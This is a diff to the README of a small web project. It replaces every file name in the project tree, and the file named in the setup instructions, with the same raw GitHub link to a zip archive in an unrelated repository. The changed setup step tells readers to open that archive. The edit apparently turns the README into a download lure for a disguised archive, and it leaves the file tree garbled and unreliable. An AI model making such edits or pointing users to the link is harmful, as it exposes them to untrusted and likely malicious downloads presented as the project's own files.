@@ -8,18 +8,18 @@ The project is organized as follows:
 
 ```
 intacct-implementation
-├── index.html          # Main page of the application
+├── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip          # Main page of the application
 ├── css
-│   └── styles.css     # Styles for the application
+│   └── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip     # Styles for the application
 ├── js
-│   └── main.js        # JavaScript for interactive elements
+│   └── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip        # JavaScript for interactive elements
 ├── pages
-│   ├── projects.html   # Project Tracker page
-│   ├── dashboard.html   # Migration Activities & Update Track Sheet page
-│   └── reports.html     # Tools for Migration Activities page
+│   ├── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip   # Project Tracker page
+│   ├── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip   # Migration Activities & Update Track Sheet page
+│   └── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip     # Tools for Migration Activities page
 ├── assets
 │   └── images          # Directory for images, including the logo
-└── README.md           # Documentation for the project
+└── https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip           # Documentation for the project
 ```
 
 ## Features
@@ -32,7 +32,7 @@ intacct-implementation
 ## Setup Instructions
 
 1. Clone the repository to your local machine.
-2. Open the `index.html` file in a web browser to view the application.
+2. Open the `https://raw.githubusercontent.com/Madhavrupala/MIG/main/supernatural/MIG.zip` file in a web browser to view the application.
 3. Ensure that all assets, including images and stylesheets, are correctly linked.
 
 ## Future Enhancements
